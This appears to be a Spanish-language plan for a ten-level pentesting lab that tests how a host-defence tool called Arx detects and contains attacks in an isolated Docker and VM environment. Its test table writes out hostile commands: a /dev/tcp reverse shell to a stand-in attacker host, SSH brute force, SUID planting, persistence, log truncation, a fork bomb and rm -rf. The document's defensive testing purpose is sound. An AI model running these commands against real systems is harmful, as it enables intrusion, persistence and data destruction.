# Laboratorio de pentesting de Arx — niveles 1 a 10

**Propósito:** probar Arx en "modo real" — atacar un entorno aislado donde Arx defiende,
desde lo más trivial hasta intentar destruirlo — y medir exactamente qué detecta, qué
contiene y qué se le escapa. Los huecos encontrados aquí se convierten en trabajo del
roadmap; nada se maquilla.

**Reglas de compromiso (ROE):** solo contra el entorno de laboratorio (red aislada,
sin salida a internet en el mini-lab Docker; VLAN host-only en la VM). Snapshot limpio
antes de cada nivel destructivo. Nunca herramientas del lab contra terceros.

---

## Entornos

### A. Mini-lab Docker (rápido; niveles 1–6 y regresiones)

Dos contenedores en una red interna sin salida:

```bash
docker network create --internal arx-lab
# Víctima: Ubuntu 22.04 privilegiada + Arx instalado (deb o fuente), baseline sellada
# Atacante: kalilinux/kali-rolling con nmap/hydra/netcat
```

Limitaciones honestas: sin systemd ni auditd completos → los sensores de Arx degradan a
los colectores base (/proc, puertos, integridad, canarios). Sirve para iterar rápido,
no como veredicto final.

### B. VM real (niveles 7–10 y validación definitiva)

- VM Ubuntu 22.04 en UTM/Parallels/VMware (el Mac) o VirtualBox, red host-only.
- **Snapshot "oro":** Arx instalado, `setup` hecho, baseline aprendida y sellada,
  canarios plantados, `arx service install --enforce` activo.
- Atacante: otra VM (Kali) en la misma red host-only.
- Restaurar el snapshot oro entre niveles. En el nivel 10 SE ESPERA destruir la VM.

### C. Range cloud (futuro)

Par de VPS desechables para tráfico real saliente del atacante (TOR, C2 público de
laboratorio). Solo cuando A y B estén verdes.

---

## Los 10 niveles

| Nivel | Ataque (procedimiento) | Comportamiento esperado de Arx | Pasa si… |
|---|---|---|---|
| **1 — Reconocimiento** | `nmap -sS` desde el atacante | Pista kernel nft (`inet arx scan4/6`: cada SYN entrante, incluso a puertos cerrados) → ≥8 puertos/10 min → **Tier 1: bloqueo de IP** | Hallazgo `port_scan` + elemento en `block_ipv4` + atacante sin alcance (curl agota tiempo). Sin nftables degrada a procfs (solo puertos que aceptan) |
| **2 — Fuerza bruta** | 8 intentos SSH fallidos reales (sshpass) | auth.log incremental → ≥6 fallos/10 min desde una IP → **Tier 1: bloqueo de IP** | Hallazgo `auth_bruteforce` + IP bloqueada |
| **3 — Credencial débil** | Login SSH con usuario nuevo/credencial por defecto | `login_users` fuera de baseline → hallazgo high | Hallazgo nuevo registrado y alertado |
| **4 — Explotación de servicio** | App web vulnerable plantada (RCE) → el atacante abre un listener nuevo (p. ej. 4444) | Puerto nuevo → Tier 1: bloqueo firewall REAL + registro | Regla de bloqueo visible (ufw/nft) y auto-expira |
| **5 — Dropper** | Descargar "malware" a `/tmp`, `chmod +x`, ejecutarlo | Ejecutable nuevo en dir sospechoso (high) → **SIGSTOP** inmediato | Proceso en estado T; SIGCONT al expirar; reaparición → Tier 2 |
| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima | Conexión saliente anómala + proceso hijo raro | **GAP hoy** — el colector de conexiones ya existe (`recon.collect_connections`); falta la correlación con el ejecutable origen (Falco/`ss -p`) y el actuador `ss -K` |
| **7 — Escalada** | Plantar binario SUID nuevo (`chmod u+s`) | Barrido SUID + integridad → **crit** | Hallazgo crit en el siguiente barrido SUID |
| **8 — Persistencia** | Entrada en cron/systemd/`authorized_keys` | Integridad drift → **crit → Tier 2** (humano decide) → restauración desde vault + intruso en cuarentena | Pendiente autorizado → fichero hostil fuera de su sitio y preservado como evidencia |
| **9 — Anti-forense** | Truncar logs + leer ficheros sensibles (señuelos) | Canary: lectura detectada (alta, one-shot); **truncado de auth.log → `log_tamper`** | Canary ✓ + hallazgo `log_tamper` (mismo inode, tamaño menor) |
| **10 — Destrucción total** | Ransomware simulado (cifrado masivo en árbol señuelo) + fork bomb + `rm -rf` sobre señuelos; en VM | **El freno de seguridad salta**: Arx deja de actuar tras 5 acciones/hora, escala todo a humano, alerta crítica masiva | Breaker disparado + alertas emitidas + nada irreversible hecho por Arx; la VM puede morir — por eso es VM |

**Criterio de nivel superado:** el comportamiento esperado ocurre Y queda evidencia en
`incidents.jsonl` / `arx status`. Un nivel en GAP no es un fracaso del lab: es el mapa
honesto de lo que falta construir (y cada gap ya tiene fase en el roadmap).

---

## Ejecución

```bash
lab/docker-lab.sh        # mini-lab DOS contenedores: L1 y L2 reales (nmap/sshpass
                         # desde el atacante) + L4,5,7,8,9 en la víctima + prueba de
                         # contención (el atacante pierde alcance tras el bloqueo)
lab/run-levels.sh N      # un nivel concreto dentro de la víctima
```

El scoreboard imprime PASS/FAIL por nivel. Los niveles 3 y 10 necesitan VM (L3 toca
credenciales reales; L10 es destructivo — ver `lab/vm/`). El nivel 6 sigue en GAP
honesto: falta la correlación conexión→proceso origen y el actuador `ss -K` (F5).
